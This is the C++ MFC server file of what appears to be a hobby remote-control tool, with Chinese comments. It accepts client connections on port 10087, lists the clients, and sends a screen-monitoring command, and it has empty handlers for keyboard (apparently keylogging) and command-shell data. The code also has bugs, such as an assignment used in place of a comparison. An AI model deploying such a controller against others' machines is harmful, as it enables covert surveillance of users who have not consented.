
// Remote-SERVERDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "Remote-SERVER.h"
#include "Remote-SERVERDlg.h"
#include "afxdialogex.h"
#include"Mysession.h"
#include"DATA.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

struct param
{
public:
	SOCKET* sclient;
	Mysession *psession;
};


DWORD WINAPI recvthread(LPVOID lparam)
{
	param* p = (param*)lparam;
	bool bret;
	char* pdata = NULL;
	while (true)
	{

		/*int getdate = 0;
		char rbuf[30] = { 0 };
		getdate = recv(*sclient, rbuf, sizeof(unsigned int) * 2, 0);
		DATA* datapacket = (DATA*)rbuf;*/

		//收取头部数据
		DATA drbuf;
		bret = recvdata(*(p->sclient), (char*)&drbuf, sizeof(unsigned int) * 2);
		if (!bret) return 0;

		if (drbuf.length > 0)
		{
			pdata = new char[drbuf.length + 5];
			if (pdata == NULL) return 0;

			recvdata(*(p->sclient), pdata, drbuf.length);


			if (drbuf.type == CLIENT_KEYBOARD_BACK)
			{
				//输出keyboard数据

			}
			else if (drbuf.type == CLIENT_CMD_BACK)
			{
				//输出cmd数据
			}
			else if (drbuf.type = CLIENT_SCREEN_BACK)
			{
				if (p->psession->pscreendlg != NULL)
				{
					//显示屏幕监控数据
					p->psession->pscreendlg->ShowWindow(SW_SHOW);
					p->psession->pscreendlg->showscreen(pdata, drbuf.length);
					if (p->psession->pscreendlg->isclose) {
						senddatahead(*(p->sclient), SERVER_SCREEN_COMMAND);
					}
				}
			}
		}
		if (pdata != NULL) delete[] pdata;
	}
	return true;
}

DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
{
	sockaddr_in clientaddr = { 0 };
	clientaddr.sin_family = AF_INET;
	int addrlen = sizeof(sockaddr_in);

	while (true)
	{
		CRemoteSERVERDlg* dlg = (CRemoteSERVERDlg*)lparam;

		SOCKET sclient = accept(dlg->sserver, (sockaddr*)&clientaddr, &addrlen);
		
		Mysession* psession = new Mysession;
		psession->sclient = sclient;
		memcpy(&(psession->clientaddr), &clientaddr, sizeof(sockaddr_in));
		psession->clientlasttime = GetTickCount();



		{
			std::lock_guard<std::mutex> lg(dlg->accept_mutex);  //对map进行锁存
			dlg->map_session.insert(std::make_pair(sclient, psession));  //记录每个客户端
		}

		char ipandport[256] = {0};
		sprintf_s(ipandport, "%s:%d", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
		int index = dlg->list_client.InsertItem(dlg->map_session.size(), ipandport);
		if (index != -1)
		{
			//序号与socket关联
			dlg->list_client.SetItemData(index, sclient);
		}

		//构建线程参数
		param p;
		p.psession = psession;
		p.sclient = &sclient;

		//客户端的recv线程
		CreateThread(0, 0, recvthread, &p, 0, 0);
		
	}
}

void CRemoteSERVERDlg::initialization()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		/* Tell the user that we could not find a usable */
		/* WinSock DLL.                                  */
		return;
	}


	this->sserver = socket(AF_INET, SOCK_STREAM, 0);


	//2.bind/listen
	//sockaddr addr;
	sockaddr_in addr;
	int length = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
	addr.sin_port = htons(10087);
	bind(this->sserver, (sockaddr*)&addr, length);


	listen(this->sserver, 5);

	this->hclient = CreateThread(0, 0, acceptthread, this, 0, 0);
}


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
//	virtual void OnCancel();
	virtual void OnCancel();
};


void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CRemoteSERVERDlg 对话框



CRemoteSERVERDlg::CRemoteSERVERDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_REMOTESERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CRemoteSERVERDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST2, list_client);
}

BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CRemoteSERVERDlg::OnNMRClickList2)
	ON_COMMAND(ID_SCREEN, &CRemoteSERVERDlg::OnScreen)
END_MESSAGE_MAP()


// CRemoteSERVERDlg 消息处理程序

BOOL CRemoteSERVERDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	list_client.InsertColumn(0, "ip:port");
	list_client.InsertColumn(1, "system");
	list_client.InsertColumn(2, "information");  //设置展示客户端信息

	list_client.SetColumnWidth(0, 200);
	list_client.SetColumnWidth(1, 200);
	list_client.SetColumnWidth(2, 200);			//设置列间距

	list_client.SetExtendedStyle(list_client.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);//设置风格

	//服务端套接字初始化并监听
	initialization();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRemoteSERVERDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteSERVERDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRemoteSERVERDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CRemoteSERVERDlg::OnNMRClickList2(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu menu;
	menu.LoadMenu(IDR_MENU1);
	CMenu* psubmenu = menu.GetSubMenu(0);


	//获取鼠标当前坐标
	CPoint cp;
	GetCursorPos(&cp);

	psubmenu->TrackPopupMenu(TPM_LEFTALIGN, cp.x, cp.y, this);




	*pResult = 0;
}


void CRemoteSERVERDlg::OnScreen()
{
	// TODO: 在此添加命令处理程序代码
	//获取当前选中行的socket,向其发送屏幕监控命令
	int pos = list_client.GetSelectionMark();

	SOCKET sclient = list_client.GetItemData(pos);

	senddatahead(sclient, SERVER_SCREEN_COMMAND);


	{
		std::lock_guard<std::mutex> lg(accept_mutex); 
		if (map_session[sclient]->pscreendlg == NULL)
		{
			map_session[sclient]->pscreendlg = new CscreenDlg;
			map_session[sclient]->pscreendlg->Create(IDD_CscreenDlg,this);
			map_session[sclient]->pscreendlg->isclose = true;
		}
	}
}

